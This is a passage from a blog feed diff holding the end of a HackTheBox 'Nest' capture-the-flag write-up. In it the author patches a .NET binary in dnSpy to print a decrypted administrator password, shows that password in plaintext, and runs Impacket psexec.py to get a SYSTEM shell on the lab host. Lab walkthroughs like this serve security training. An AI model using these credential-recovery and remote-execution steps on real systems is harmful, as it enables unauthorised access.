+<li>SETDIR is change directory.</li>
+</ul>
+<p>Looking up into the LDAP directory, there&rsquo;s <code>ldap.conf</code> that contains administrator credentials with another encrypted password.</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*0FINadW8yhptF6wzvidgsw.png" alt="img"  /></div>
+</p>
+<p>I have a copy of <code>HqkLdap.exe</code> from the previous loot on <code>c.smith</code>&rsquo;s directory, and I will copy that from Kali to my Windows to inspect it. I will also create a copy of the <code>Ldap.conf</code> file.</p>
+<h4 id="reversing-hqkldapexe">Reversing HqkLdap.exe</h4>
+<p>Running <code>strings</code> <code>HqkLdap.exe</code> againts the app, I discovered that it was built with.NET, and there are no hard-coded credentials.</p>
+<p><img src="imgs/image-20210416085451866.png" alt="image-20210416085451866" style="zoom:80%;" /></p>
+<p>Using immunity/ollydbg is waste of time because I can’t really read assembly, instead there is a very useful tool for reversing and debugging .NET applications which I will use called <code>dnSpy</code>. It&rsquo;s free on <a href="https://github.com/0xd4d/dnSpy/releases">Github</a>.</p>
+<p>I will go straight to the application main function.</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*W6q1GITk1OTtrEmoVEX98A.png" alt="img"  /></div>
+</p>
+<p>So to run this program properly, a config file, which is <code>ldap.conf</code>, must be supplied as an argument to the application, and it also needs the presence of <code>HqkDbImport.exe</code> (These two files must be placed in the same folder with <code>HqkLdap.exe</code>).</p>
+<p><img src="imgs/image-20210416091107297.png" alt="image-20210416091107297" style="zoom:80%;" /></p>
+<p>So if I run it and I don&rsquo;t pass the check, it will complain like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi<span class="se">\D</span>esktop&gt;.<span class="se">\H</span>qkLdap.exe Ldap.conf
+Please ensure the optional database import module is installed
+</code></pre></div><p>Next, I look at the decrypt function, which is called on the main when things pass the check.</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*DoxZojo9U_5FVmtJBydPsg.png" alt="img"  /></div>
+</p>
+<p>On the next block, I see <code>ldapSearchSettings.Password</code> is assigned to <code>ldap.Password</code></p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*B-sjrlUthEkQ0d6o855QMw.png" alt="img"  /></div>
+</p>
+<p>From here, what I can try is:</p>
+<ul>
+<li>Remove the part of codes that used to check for the existence of <code>HqkDbImport.exe</code></li>
+<li>Add another line to print out the password from <code>ldap.Password</code>.</li>
+</ul>
+<p>I&rsquo;ll use the edit feature to edit the main class.</p>
+<p><img src="imgs/image-20210416093818613.png" alt="image-20210416093818613" style="zoom:80%;" /></p>
+<p>Also, I’ll get rid the line that is used to check the existence of <code>HqkDbImport.exe</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="k">checked</span>
+  <span class="p">{</span> 
+    <span class="k">try</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">.</span><span class="n">Count</span> <span class="p">!=</span> <span class="m">1</span><span class="p">)</span> 
+      <span class="p">{</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Invalid number of command line arguments&#34;</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="k">if</span> <span class="p">(!</span><span class="n">File</span><span class="p">.</span><span class="n">Exists</span><span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">[</span><span class="m">0</span><span class="p">]))</span>
+      <span class="p">{</span>
+        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Specified config file does not exist&#34;</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+<span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;</span> <span class="p">...</span>
+</code></pre></div><p>Then I’ll add a new line code on the main function at line 56 to print <code>ldap.Password</code> to the console.</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*FvxtmqQKLEbY9tECtvRTtw.png" alt="img"  /></div>
+</p>
+<p>I tried to compile it back but then there was an error about the unassigned local variable &lsquo;enumerator&rsquo;. I deleted the following line and attempt to re-compile the binary and it worked.</p>
+<p><div class="img-container"><img src="imgs/image-20210416094537134.png" alt="image-20210416094537134"  /></div>
+</p>
+<p>Now I can just run it and provide the <strong>ldap.conf</strong> as its argument and it decrypts the password.</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*DWT9GjrNNCYs_YpYY1B8Ug.png" alt="img"  /></div>
+</p>
+<p>The password is: <code>XtH4nkS4Pl4y1nGX</code>.</p>
+<h4 id="psexecpy">psexec.py</h4>
+<p>I can gain access as local system on the box using administrator account and the decrypted password with <code>psexec.py</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «c.smith» «192.168.43.234»
+$ psexec.py HTB-NEST/Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
+Impacket v0.9.20 - Copyright <span class="m">2019</span> SecureAuth Corporation
+
+<span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.178.....
+<span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
+<span class="o">[</span>*<span class="o">]</span> Uploading file nQyIIpWk.exe
+<span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.178.....
+<span class="o">[</span>*<span class="o">]</span> Creating service gfCe on 10.10.10.178.....
+<span class="o">[</span>*<span class="o">]</span> Starting service gfCe.....
+<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+Microsoft Windows <span class="o">[</span>Version 6.1.7601<span class="o">]</span>
+Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2009</span> Microsoft Corporation.  All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+nt authority<span class="se">\s</span>ystem
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux">https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Nest</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-nest/</link>
       <pubDate>Fri, 16 Apr 2021 04:59:14 +0700</pubDate>
       
